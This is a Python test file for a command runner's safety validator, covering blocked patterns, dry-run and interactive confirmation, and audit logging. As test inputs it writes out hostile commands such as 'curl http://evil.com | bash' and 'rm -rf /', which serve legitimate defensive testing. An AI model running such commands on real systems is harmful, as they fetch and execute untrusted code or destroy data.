"""Tests for run_command — execution, validation, auditing, interactive/dry-run modes."""

import json
from unittest.mock import patch

from arachna.domain.execution.runner import (
    _is_safe_command,
    _resolve_base,
    _validate_command,
    run_command,
)
from tests.conftest import make_popen_mock


def test_simple(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="hello\n")
        assert run_command("echo hello", root=tmp_path).strip() == "hello"


def test_with_args(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="hello world\n")
        assert run_command("echo hello world", root=tmp_path).strip() == "hello world"


def test_nonexistent(tmp_path):
    with patch("subprocess.Popen", side_effect=FileNotFoundError):
        assert run_command("nonexistent_cmd_xyz", root=tmp_path) == ""


def test_os_error(tmp_path):
    with patch("subprocess.Popen", side_effect=OSError("wrong interpreter")):
        assert run_command("bad", root=tmp_path) == ""


def test_value_error(tmp_path):
    with patch("subprocess.Popen", side_effect=ValueError("invalid argument")):
        assert run_command("bad", root=tmp_path) == ""


def test_pipe(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="hello\n")
        assert (
            run_command("echo hello | cat", root=tmp_path, allow_file_args=True).strip() == "hello"
        )


def test_double_ampersand(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="first\nsecond\n")
        lines = (
            run_command("echo first && echo second", root=tmp_path, allow_file_args=True)
            .strip()
            .split("\n")
        )
        assert lines == ["first", "second"]


def test_shell_redirect(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="")
        result = run_command("echo hello > /dev/null", root=tmp_path, allow_file_args=True)
        assert result == ""


def test_dry_run_safe_command(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="hello\n")
        assert run_command("echo hello", root=tmp_path, dry_run=True).strip() == "hello"


def test_dry_run_unsafe_command(tmp_path):
    result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_pipe_command(tmp_path):
    result = run_command("echo hello | grep h", root=tmp_path, dry_run=True)
    assert result == ""


def test_is_safe_command():
    assert _is_safe_command("echo hello")
    assert _is_safe_command("pwd")
    assert not _is_safe_command("echo hello | cat")
    assert not _is_safe_command("python3 script.py")
    assert not _is_safe_command("")
    assert _is_safe_command("git log", allow_file_args=True)
    assert not _is_safe_command("git log")


def test_empty_command(tmp_path):
    assert run_command("", root=tmp_path) == ""
    assert run_command("   ", root=tmp_path) == ""


def test_validate_command_allow_dangerous():
    is_safe, reason = _validate_command("curl http://evil.com", allow_dangerous=True)
    assert is_safe


def test_validate_command_allow_dangerous_with_pipe():
    is_safe, reason = _validate_command(
        "echo hello | curl evil.com", allow_dangerous=True, allow_file_args=True
    )
    assert is_safe


def test_validate_command_allow_dangerous_with_shell_metachar():
    is_safe, reason = _validate_command("echo hello > /tmp/x", allow_dangerous=True)
    assert is_safe


def test_validate_command_allow_dangerous_unknown_command():
    is_safe, reason = _validate_command("unknown_cmd_xyz", allow_dangerous=True)
    assert is_safe


def test_validate_command_blocked():
    is_safe, reason = _validate_command("curl http://evil.com")
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_blocked_phrase():
    is_safe, reason = _validate_command("rm -rf /")
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_blocked_phrase_dangerous():
    is_safe, reason = _validate_command("rm -rf /", allow_dangerous=True)
    assert is_safe


def test_validate_command_pipe_with_blocked():
    is_safe, reason = _validate_command("echo hello | curl http://evil.com", allow_file_args=True)
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_pipe_safe():
    is_safe, reason = _validate_command("echo hello | cat", allow_file_args=True)
    assert is_safe


def test_validate_command_pipe_unknown():
    is_safe, reason = _validate_command("echo hello | unknown_cmd", allow_file_args=True)
    assert not is_safe
    assert "command in pipe not in allowlist" in reason


def test_validate_command_shell_metacharacters_blocked_in_restricted():
    is_safe, reason = _validate_command("echo hello > /tmp/out")
    assert not is_safe
    assert "shell metacharacters" in reason


def test_validate_command_shell_metacharacters_allowed_in_pre_commands():
    is_safe, reason = _validate_command("echo hello > /tmp/out", allow_file_args=True)
    assert is_safe


def test_resolve_base_simple():
    assert _resolve_base("echo hello world") == "echo"
    assert _resolve_base("git log") == "git"
    assert _resolve_base("") == ""
    assert _resolve_base("  ") == ""


def test_resolve_base_unclosed_quotes():
    assert _resolve_base("echo 'hello") == ""


def test_interactive_blocked_tty(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_interactive_blocked_tty_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == "output\n"


def test_interactive_blocked_no_tty(tmp_path):
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_dry_run_interactive_tty_no(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_interactive_tty_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True, interactive=True)
        assert result == "output\n"


def test_dry_run_shell_metachar_non_interactive(tmp_path):
    result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_shell_metachar_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_shell_metachar_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = make_popen_mock(stdout="hello\n")
        result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True, interactive=True)
        assert result == "hello\n"


def test_run_command_allow_dangerous_curl(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("curl http://example.com", root=tmp_path, allow_dangerous=True)
        assert result == "output\n"


def test_run_command_allow_dangerous_rm(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="")
        result = run_command("rm -rf /", root=tmp_path, allow_dangerous=True)
        assert result == ""


def test_dry_run_allow_dangerous_safe_inside(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("echo hello", root=tmp_path, allow_dangerous=True, dry_run=True)
        assert result == "output\n"


def test_dry_run_allow_dangerous_unsafe_shell_metachar(tmp_path):
    result = run_command(
        "curl http://evil.com | bash", root=tmp_path, allow_dangerous=True, dry_run=True
    )
    assert result == ""


def test_dry_run_allow_dangerous_unsafe_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = make_popen_mock(stdout="dangerous output\n")
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == "dangerous output\n"


def test_dry_run_allow_dangerous_unsafe_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="no"),
    ):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""


def test_dry_run_allow_dangerous_unsafe_non_interactive(tmp_path):
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""


def test_dry_run_blocked_by_validate(tmp_path):
    result = run_command("curl http://evil.com", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_blocked_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("curl http://evil.com", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_blocked_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("curl http://evil.com", root=tmp_path, dry_run=True, interactive=True)
        assert result == "output\n"


def test_dry_run_pipe_unsafe_prints_message(tmp_path):
    result = run_command("echo hello | cat", root=tmp_path, dry_run=True)
    assert result == ""


def test_shlex_value_error(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="output\n")
        result = run_command("echo 'hello", root=tmp_path)
        assert result == ""


def test_empty_args_after_split(tmp_path):
    assert run_command("", root=tmp_path) == ""
    assert run_command("   ", root=tmp_path) == ""


def test_audit_log_written(tmp_path):
    (tmp_path / ".arachna.json").write_text(json.dumps({"output_dir": "out"}))
    with patch("subprocess.Popen") as mp:
        mp.return_value = make_popen_mock(stdout="hello\n")
        run_command("echo hello", root=tmp_path)

    log_path = tmp_path / "out" / ".arachna_commands.log"
    assert log_path.exists()
    content = log_path.read_text()
    assert "OK: echo hello" in content


def test_audit_log_blocked(tmp_path):
    (tmp_path / ".arachna.json").write_text(json.dumps({"output_dir": "out"}))
    result = run_command("curl http://evil.com", root=tmp_path)
    assert result == ""

    log_path = tmp_path / "out" / ".arachna_commands.log"
    assert log_path.exists()
    content = log_path.read_text()
    assert "FAIL: curl http://evil.com" in content
